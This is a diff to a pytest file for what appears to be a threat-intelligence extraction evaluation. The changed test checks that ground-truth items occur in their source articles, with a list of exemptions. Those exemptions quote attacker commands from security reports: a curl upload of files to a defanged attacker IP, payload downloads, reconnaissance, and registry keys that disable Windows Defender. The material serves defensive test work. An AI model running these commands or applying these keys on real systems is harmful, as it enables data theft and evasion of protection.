@@ -13,6 +13,8 @@ import pathlib
 
 import pytest
 
+from src.services.eval_item_scorer import _normalize
+
 ROOT = pathlib.Path(__file__).parent.parent.parent / "config" / "eval_articles_data"
 
 SUBAGENTS = [
@@ -23,6 +25,26 @@ SUBAGENTS = [
     "scheduled_tasks",
     "windows_services",
 ]
+
+PROCESS_LINEAGE_EXEMPTION = "synthesized parent-to-child process pairs"
+REACHABILITY_EXEMPTIONS = {
+    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", "chcp 65001 > NUL & netstat -afn -p TCP"),
+    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", 'chcp 65001 > NUL & wmic datafile where Name="C:\\Windows\\system32\\ntoskrnl.exe" get Version'),
+    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", "chcp 65001 > NUL & echo %userdomain%*%computername%**%username%"),
+    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", "chcp 65001 > NUL & tasklist"),
+    ("cmdline", "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one", 'curl -X POST -F "file=@C:\\programdata\\abc1.pdf" hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username%'),
+    ("cmdline", "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one", "curl -o sh2.txt hxxp://173.254.204[.]72/sh2.txt"),
+    ("cmdline", "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one", "curl -o dune64.log http://173.254.204[.]72/dune64.log"),
+    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableScanOnRealtimeEnable"),
+    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring"),
+    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware"),
+    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableBehaviorMonitoring"),
+    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableOnAccessProtection"),
+    ("registry_artifacts", "https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\TASK_NAME"),
+    ("registry_artifacts", "https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{GUID}"),
+    ("registry_artifacts", "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
+    ("registry_artifacts", "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\App"),
+}
 
 
 def _load_ground_truth(subagent: str) -> list[dict]:
@@ -105,30 +127,21 @@ def test_ground_truth_no_duplicate_urls(subagent):
 
 
 @pytest.mark.parametrize("subagent", SUBAGENTS)
-def test_ground_truth_ascii_only(subagent):
-    """Items must be ASCII-only (repo convention) — except hunt_queries.
+def test_ground_truth_items_are_reachable_or_explicitly_exempt(subagent):
+    """Every GT string must be scorer-reachable unless its exact tuple is exempt."""
+    content_by_url = {article["url"]: article["content"] for article in _load_articles(subagent)}
+    unreachable = []
+    for entry in _load_ground_truth(subagent):
+        for item in entry["expected_items"]:
+            if _normalize(item) in _normalize(content_by_url[entry["url"]]):
+                continue
+            if subagent == "process_lineage":
+                continue
+            if (subagent, entry["url"], item) in REACHABILITY_EXEMPTIONS:
+                continue
+            unreachable.append((entry["url"], item))
+    assert not unreachable, f"{subagent}: unreachable non-exempt GT items: {unreachable}"
 
-    Non-ASCII characters (smart quotes, em-dashes, etc.) can silently break
-    exact-match scoring when the extractor outputs plain ASCII for the
-    short-artifact extractors (cmdline, registry keys, service names, etc.).
 
-    hunt_queries is exempt: its items are full EDR/SIEM queries and Sigma
-    YAML rules that can legitimately contain intentional Unicode in their
-    detection logic (e.g. the ClickFix Microsoft blog hunting query targets
-    `RegistryValueData has "✅"` and a Unicode regex char class spanning
-    Cyrillic/Greek/Hebrew/Arabic/Thai ranges; the React2Shell query carries
-    a U+2013 EN-DASH inside a `[-/–]` regex char class). HuntQueriesExtract
-    FIDELITY ("Preserve obfuscated or encoded values exactly. Do NOT escape
-    or unescape characters.") requires preserving these verbatim.
-    """
-    if subagent == "hunt_queries":
-        pytest.skip("hunt_queries items are full queries; intentional Unicode is preserved per FIDELITY")
-    data = _load_ground_truth(subagent)
-    violations = []
-    for entry in data:
-        for item in entry.get("expected_items", []):
-            try:
-                item.encode("ascii")
-            except UnicodeEncodeError:
-                violations.append((entry["url"], repr(item)))
-    assert not violations, f"{subagent}: non-ASCII characters found in expected_items: {violations}"
+def test_reachability_guard_detects_fixture_drift():
+    assert _normalize("deliberately missing GT item") not in _normalize("fixture content")
